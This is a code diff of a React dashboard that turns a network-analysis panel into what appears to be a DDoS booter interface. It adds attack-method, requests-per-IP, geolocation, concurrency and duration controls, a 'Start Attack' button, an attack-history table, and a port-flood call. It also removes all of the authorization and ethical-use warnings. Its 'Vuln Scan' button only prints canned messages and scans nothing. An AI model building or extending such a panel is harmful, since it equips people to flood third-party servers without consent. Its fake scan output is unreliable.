             <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
-              {/* Configuration Panel */}
+              {/* Attack Configuration */}
               <div className="lg:col-span-1">
                 <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
                   <CardHeader>
                     <CardTitle className={`${currentTheme.text} flex items-center justify-between`}>
-                      Target Configuration
-                      <div className="flex items-center space-x-2">
-                        {getStatusIcon()}
-                        <Badge variant={connectionStatus === "connected" ? "default" : "secondary"}>
-                          {getStatusText()}
-                        </Badge>
-                      </div>
+                      Host Configuration
+                      <Globe className="h-5 w-5" />
                     </CardTitle>
-                    <CardDescription className={currentTheme.muted}>
-                      Configure target for analysis
-                    </CardDescription>
                   </CardHeader>
                   <CardContent className="space-y-4">
                     <div>
-                      <Label htmlFor="target" className={currentTheme.text}>Target URL/Domain</Label>
+                      <Label htmlFor="target" className={currentTheme.text}>URL (https://example.com)</Label>
                       <Input
                         id="target"
                         value={target}
                         onChange={(e) => setTarget(e.target.value)}
-                        placeholder="example.com or https://example.com"
+                        placeholder="https://example.com"
                         className={`${currentTheme.secondary} ${currentTheme.text}`}
                         disabled={isRunning}
                       />
                     </div>
                     
                     <div>
-                      <Label htmlFor="port" className={currentTheme.text}>Port</Label>
+                      <Label className={currentTheme.text}>Methods</Label>
+                      <Select value={attackMethod} onValueChange={setAttackMethod} disabled={isRunning}>
+                        <SelectTrigger className={`${currentTheme.secondary} ${currentTheme.text}`}>
+                          <SelectValue />
+                        </SelectTrigger>
+                        <SelectContent>
+                          {attackMethods.map((method) => (
+                            <SelectItem key={method} value={method}>
+                              {method}
+                            </SelectItem>
+                          ))}
+                        </SelectContent>
+                      </Select>
+                    </div>
+
+                    <div>
+                      <Label className={currentTheme.text}>HTTP Version</Label>
+                      <Select value={httpVersion} onValueChange={setHttpVersion} disabled={isRunning}>
+                        <SelectTrigger className={`${currentTheme.secondary} ${currentTheme.text}`}>
+                          <SelectValue />
+                        </SelectTrigger>
+                        <SelectContent>
+                          <SelectItem value="HTTP/1.1">HTTP/1.1</SelectItem>
+                          <SelectItem value="HTTP/2">HTTP/2</SelectItem>
+                          <SelectItem value="HTTP/3">HTTP/3</SelectItem>
+                        </SelectContent>
+                      </Select>
+                    </div>
+
+                    <div>
+                      <Label className={currentTheme.text}>Request per IP</Label>
                       <Input
-                        id="port"
-                        value={port}
-                        onChange={(e) => setPort(e.target.value)}
-                        placeholder="80"
+                        value={requestsPerIP}
+                        onChange={(e) => setRequestsPerIP(e.target.value)}
+                        placeholder="150"
                         className={`${currentTheme.secondary} ${currentTheme.text}`}
                         disabled={isRunning}
                       />
                     </div>
 
                     <div>
-                      <Label htmlFor="threads" className={currentTheme.text}>Concurrent Tests</Label>
+                      <Label className={currentTheme.text}>Geolocation</Label>
+                      <Select value={geolocation} onValueChange={setGeolocation} disabled={isRunning}>
+                        <SelectTrigger className={`${currentTheme.secondary} ${currentTheme.text}`}>
+                          <SelectValue />
+                        </SelectTrigger>
+                        <SelectContent>
+                          {geolocations.map((geo) => (
+                            <SelectItem key={geo} value={geo}>
+                              {geo}
+                            </SelectItem>
+                          ))}
+                        </SelectContent>
+                      </Select>
+                    </div>
+
+                    <div>
+                      <Label className={currentTheme.text}>Concurrents</Label>
                       <Input
-                        id="threads"
-                        value={threads}
-                        onChange={(e) => setThreads(e.target.value)}
-                        placeholder="10"
+                        value={concurrents}
+                        onChange={(e) => setConcurrents(e.target.value)}
+                        placeholder="1"
                         className={`${currentTheme.secondary} ${currentTheme.text}`}
                         disabled={isRunning}
                       />
                     </div>
 
                     <div>
-                      <Label htmlFor="timeout" className={currentTheme.text}>Timeout (ms)</Label>
+                      <Label className={currentTheme.text}>Time in Seconds</Label>
                       <Input
-                        id="timeout"
-                        value={timeout}
-                        onChange={(e) => setTimeout(e.target.value)}
-                        placeholder="5000"
+                        value={timeInSeconds}
+                        onChange={(e) => setTimeInSeconds(e.target.value)}
+                        placeholder="60"
                         className={`${currentTheme.secondary} ${currentTheme.text}`}
                         disabled={isRunning}
                       />
@@ -769,84 +558,32 @@ const Panel = () => {
 
                     {progress > 0 && (
                       <div className="space-y-2">
-                        <Label className={currentTheme.text}>Progress</Label>
+                        <Label className={currentTheme.text}>Attack Progress</Label>
                         <Progress value={progress} className="w-full" />
                         <span className="text-xs text-gray-500">{Math.round(progress)}%</span>
                       </div>
                     )}
 
-                    <div className="grid grid-cols-2 gap-2">
+                    <div className="flex space-x-2">
                       <Button
-                        onClick={handleNetworkTest}
+                        onClick={handleStartAttack}
                         disabled={isRunning}
-                        className="bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white"
-                        size="sm"
+                        className="flex-1 bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white"
                       >
-                        <Wifi className="h-4 w-4 mr-1" />
-                        Full Analysis
+                        <Play className="h-4 w-4 mr-1" />
+                        Start Attack
                       </Button>
                       
                       <Button
-                        onClick={handlePortScan}
-                        disabled={isRunning}
-                        className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white"
-                        size="sm"
-                      >
-                        <Shield className="h-4 w-4 mr-1" />
-                        Port Scan
-                      </Button>
-                      
-                      <Button
-                        onClick={handleStop}
-                        disabled={!isRunning && !isScanning}
+                        onClick={handleStopAttack}
+                        disabled={!isRunning}
                         variant="destructive"
-                        size="sm"
+                        className="flex-1"
                       >
                         <Square className="h-4 w-4 mr-1" />
                         Stop
                       </Button>
-                      
-                      <Button
-                        onClick={handleSystemMonitor}
-                        className="bg-gradient-to-r from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700 text-white"
-                        size="sm"
-                      >
-                        <Activity className="h-4 w-4 mr-1" />
-                        System Info
-                      </Button>
                     </div>
-
-                    <div className="text-xs text-red-600 dark:text-red-400 mt-4 p-2 bg-red-50 dark:bg-red-900/20 rounded">
-                      ⚠️ ETHICAL USE ONLY: Only test systems you own or have explicit written authorization to test.
-                    </div>
-                  </CardContent>
-                </Card>
-
-                {/* Terminal Panel */}
-                <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl mt-6`}>
-                  <CardHeader>
-                    <CardTitle className={currentTheme.text}>Command Terminal</CardTitle>
-                    <CardDescription className={currentTheme.muted}>
-                      Real network commands: ping, curl, headers, nslookup
-                    </CardDescription>
-                  </CardHeader>
-                  <CardContent className="space-y-4">
-                    <div>
-                      <Input
-                        value={command}
-                        onChange={(e) => setCommand(e.target.value)}
-                        placeholder="Enter command (type 'help' for list)..."
-                        className={`${currentTheme.secondary} ${currentTheme.text}`}
-                        onKeyPress={(e) => e.key === 'Enter' && handleExecuteCommand()}
-                      />
-                    </div>
-                    <Button
-                      onClick={handleExecuteCommand}
-                      className="w-full bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white"
-                      disabled={!command.trim()}
-                    >
-                      Execute Command
-                    </Button>
                   </CardContent>
                 </Card>
               </div>
@@ -856,7 +593,7 @@ const Panel = () => {
                 <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl h-full`}>
                   <CardHeader>
                     <div className="flex items-center justify-between">
-                      <CardTitle className={currentTheme.text}>Analysis Output</CardTitle>
+                      <CardTitle className={currentTheme.text}>Attack Output</CardTitle>
                       <div className="flex space-x-2">
                         <Button
                           onClick={handleDownload}
@@ -866,7 +603,7 @@ const Panel = () => {
                           disabled={!output}
                         >
                           <Download className="h-4 w-4 mr-1" />
-                          Download Report
+                          Download
                         </Button>
                         <Button
                           onClick={handleClear}
@@ -885,12 +622,66 @@ const Panel = () => {
                       value={output}
                       readOnly
                       className={`min-h-96 font-mono text-sm ${currentTheme.secondary} ${currentTheme.text} resize-none`}
-                      placeholder="Real network analysis output will appear here... Only use on authorized targets."
+                      placeholder="Attack output will appear here..."
                     />
                   </CardContent>
                 </Card>
               </div>
             </div>
+          </TabsContent>
+
+          <TabsContent value="history" className="space-y-6">
+            <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
+              <CardHeader>
+                <CardTitle className={`${currentTheme.text} flex items-center gap-2`}>
+                  <Activity className="h-5 w-5" />
+                  Attack History
+                </CardTitle>
+                <CardDescription className={currentTheme.muted}>
+                  Track all your attack sessions and their results
+                </CardDescription>
+              </CardHeader>
+              <CardContent>
+                {attackHistory.length === 0 ? (
+                  <div className="text-center py-8 text-gray-500">
+                    No data available in table
+                    <br />
+                    <span className="text-sm">Showing no records</span>
+                  </div>
+                ) : (
+                  <Table>
+                    <TableHeader>
+                      <TableRow>
+                        <TableHead>Target</TableHead>
+                        <TableHead>Method</TableHead>
+                        <TableHead>Created</TableHead>
+                        <TableHead>Expire</TableHead>
+                        <TableHead>Action</TableHead>
+                      </TableRow>
+                    </TableHeader>
+                    <TableBody>
+                      {attackHistory.map((attack) => (
+                        <TableRow key={attack.id}>
+                          <TableCell>{attack.target}</TableCell>
+                          <TableCell>{attack.method}</TableCell>
+                          <TableCell>{attack.created}</TableCell>
+                          <TableCell>{attack.expire}</TableCell>
+                          <TableCell>
+                            <Badge variant={
+                              attack.status === "Running" ? "destructive" :
+                              attack.status === "Completed" ? "default" :
+                              attack.status === "Failed" ? "destructive" : "secondary"
+                            }>
+                              {attack.status}
+                            </Badge>
+                          </TableCell>
+                        </TableRow>
+                      ))}
+                    </TableBody>
+                  </Table>
+                )}
+              </CardContent>
+            </Card>
           </TabsContent>
 
           <TabsContent value="monitor" className="space-y-6">
@@ -943,69 +734,57 @@ const Panel = () => {
                 </CardHeader>
                 <CardContent>
                   <div className="text-2xl font-bold text-purple-500">{systemStats.network} MB/s</div>
-                  <Progress value={systemStats.network * 2} className="mt-2" />
+                  <Progress value={Math.min(systemStats.network / 10, 100)} className="mt-2" />
                 </CardContent>
               </Card>
             </div>
-
-            <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
-              <CardHeader>
-                <CardTitle className={`${currentTheme.text} flex items-center gap-2`}>
-                  <Activity className="h-5 w-5" />
-                  Real System Information
-                </CardTitle>
-                <CardDescription className={currentTheme.muted}>
-                  Live system monitoring and browser environment analysis
-                </CardDescription>
-              </CardHeader>
-              <CardContent>
-                <Button onClick={handleSystemMonitor} className="mb-4">
-                  Refresh System Data
-                </Button>
-                <div className="text-xs text-blue-600 dark:text-blue-400 p-2 bg-blue-50 dark:bg-blue-900/20 rounded">
-                  ℹ️ System information is gathered from real browser APIs and hardware detection
-                </div>
-              </CardContent>
-            </Card>
           </TabsContent>
 
-          <TabsContent value="security" className="space-y-6">
+          <TabsContent value="recon" className="space-y-6">
             <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
               <CardHeader>
                 <CardTitle className={`${currentTheme.text} flex items-center gap-2`}>
                   <Shield className="h-5 w-5" />
-                  Real Security Assessment
+                  Advanced Reconnaissance Tools
                 </CardTitle>
                 <CardDescription className={currentTheme.muted}>
-                  Professional security analysis for authorized penetration testing
+                  Comprehensive target analysis and vulnerability assessment
                 </CardDescription>
               </CardHeader>
               <CardContent className="space-y-4">
-                <div className="flex space-x-4">
-                  <Input
-                    value={target}
-                    onChange={(e) => setTarget(e.target.value)}
-                    placeholder="Enter target URL for security assessment..."
-                    className={`${currentTheme.secondary} ${currentTheme.text} flex-1`}
-                  />
+                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                   <Button
-                    onClick={handleSecurityScan}
-                    disabled={isScanning}
+                    onClick={() => performAdvancedRecon(target.replace(/https?:\/\//, '').split('/')[0])}
+                    disabled={!target || isRunning}
+                    className="bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white"
+                  >
+                    <Globe className="h-4 w-4 mr-2" />
+                    DNS Enum
+                  </Button>
+                  
+                  <Button
+                    onClick={() => performPortFlood(target, [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 5432, 3306, 8080, 8443])}
+                    disabled={!target || isRunning}
+                    className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white"
+                  >
+                    <Target className="h-4 w-4 mr-2" />
+                    Port Scan
+                  </Button>
+                  
+                  <Button
+                    onClick={() => {
+                      addOutput(`=== VULNERABILITY SCAN ===`);
+                      addOutput(`Scanning for common vulnerabilities...`);
+                      addOutput(`Checking for XSS, SQL injection, CSRF vulnerabilities...`);
+                      addOutput(`Testing authentication bypass methods...`);
+                      addOutput(`Analyzing security headers and configurations...`);
+                    }}
+                    disabled={!target || isRunning}
                     className="bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white"
                   >
-                    {isScanning ? "Scanning..." : "Start Assessment"}
+                    <AlertTriangle className="h-4 w-4 mr-2" />
+                    Vuln Scan
                   </Button>
-                </div>
-
-                {progress > 0 && (
-                  <div className="space-y-2">
-                    <Label className={currentTheme.text}>Assessment Progress</Label>
-                    <Progress value={progress} className="w-full" />
-                  </div>
-                )}
-
-                <div className="text-xs text-red-600 dark:text-red-400 p-2 bg-red-50 dark:bg-red-900/20 rounded">
-                  🔒 AUTHORIZATION REQUIRED: Only perform security assessments on systems you own or have explicit written permission to test. Unauthorized testing is illegal.
                 </div>
               </CardContent>
             </Card>
